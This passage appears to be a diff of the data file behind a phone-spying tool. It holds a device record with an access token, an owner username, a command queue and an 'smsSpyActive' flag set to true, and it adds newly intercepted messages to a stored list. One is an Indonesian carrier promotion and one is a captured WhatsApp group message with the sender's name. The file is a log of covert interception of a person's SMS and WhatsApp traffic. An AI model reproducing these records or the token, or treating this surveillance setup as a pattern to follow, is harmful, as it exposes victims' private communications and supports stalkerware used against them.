@@ -2149,7 +2149,7 @@
     "deviceName": "HP-ABIR123-0330",
     "ownerUsername": "Fibersec",
     "token": "ab095dd2405dc78cf8aaa200b596d4bd",
-    "lastSeen": 1777766673333,
+    "lastSeen": 1777766685349,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-05-02T20:52:30.047Z",
@@ -2165,6 +2165,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Messages",
+        "sender": "IM3 DEALS",
+        "content": "EKSTRA 1GB+2.5GB PLUS AKSES VIU PREMIUM 7HARI hny 15K. Beli di myim3.co/fp3gb atau cek *888*555# skrg!",
+        "time": "03/05 07:04",
+        "pkg": "com.google.android.apps.messaging",
+        "receivedAt": 1777766686339
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎PP AZKHAL MUSTOFA CIKUDA (3 pesan): ~ Paisal",
